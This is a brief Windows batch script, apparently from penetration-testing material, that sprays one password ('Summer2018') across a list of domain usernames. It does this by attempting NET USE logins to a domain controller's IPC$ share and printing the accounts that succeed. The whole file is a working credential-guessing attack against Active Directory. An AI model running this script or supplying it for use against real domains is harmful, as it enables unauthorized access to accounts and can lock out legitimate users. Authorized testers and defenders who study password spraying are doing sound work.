REM Credit to Joff Thyer: "Hunting Persistent Threats"
REM Note: if usernames are in UPN format, use /USER:%%U without the DOMAIN\ prefix
@echo off
SET "DC=DC.DOMAIN.COM"
SET "PASS=Summer2018"

FOR /F %%U IN (users.txt) DO (
  NET USE \\%DC%\IPC$ /USER:DOMAIN\%%U "%PASS%" 1>NUL 2>&1 && echo [*] %%U:"%PASS%" success && @NET USE /DELETE \\%DC%\IPC$ >NUL
)

